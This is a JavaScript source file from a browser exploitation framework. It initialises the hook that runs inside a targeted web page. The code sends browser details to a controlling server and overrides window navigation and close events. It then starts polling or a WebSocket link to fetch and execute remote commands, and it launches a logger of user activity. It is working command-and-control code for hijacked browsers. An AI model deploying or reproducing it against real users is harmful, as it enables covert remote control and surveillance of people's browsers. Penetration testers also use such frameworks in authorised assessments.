//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * Contains the server_init() method which starts the Server client-side
 * logic. Also, it overrides the 'onpopstate' and 'onclose' events on the windows object.
 *
 * If server.pageIsLoaded is true, then this JS has been loaded >1 times
 * and will have a new session id. The new session id will need to know
 * the brwoser details. So sendback the browser details again.
 * 
 * @namespace server.init
 */

server.session.get_hook_session_id();

if (server.pageIsLoaded) {
    server.net.browser_details();
}
/**
 * @memberof server.init
 */
window.onload = function () {
    server_init();
};
/**
 * @memberof server.init
 */
window.onpopstate = function (event) {
    if (server.onpopstate.length > 0) {
        event.preventDefault;
        for (var i = 0; i < server.onpopstate.length; i++) {
            var callback = server.onpopstate[i];
            try {
                callback(event);
            } catch (e) {
                server.debug("window.onpopstate - couldn't execute callback: " + e.message);
            }
            return false;
        }
    }
};
/**
 * @memberof server.init
 */
window.onclose = function (event) {
    if (server.onclose.length > 0) {
        event.preventDefault;
        for (var i = 0; i < server.onclose.length; i++) {
            var callback = server.onclose[i];
            try {
                callback(event);
            } catch (e) {
                server.debug("window.onclose - couldn't execute callback: " + e.message);
            }
            return false;
        }
    }
};

/**
 * Starts the polling mechanism, and initialize various components:
 *  - browser details (see browser.js) are sent back to the "/init" handler
 *  - the polling starts (checks for new commands, and execute them)
 *  - the logger component is initialized (see logger.js)
 *  - the Autorun Engine is initialized (see are.js)
 * @memberof server.init
 */
function server_init() {
    if (!server.pageIsLoaded) {
        server.pageIsLoaded = true;
        server.net.browser_details();

        if (server.browser.hasWebSocket() && typeof server.websocket != 'undefined') {
            setTimeout(function(){
                server.websocket.start();
                server.updater.execute_commands();
                server.logger.start();
            }, parseInt(server.websocket.ws_connect_timeout));
        }else {
            server.net.browser_details();
            server.updater.execute_commands();
            server.updater.check();
            server.logger.start();
        }
    }
}
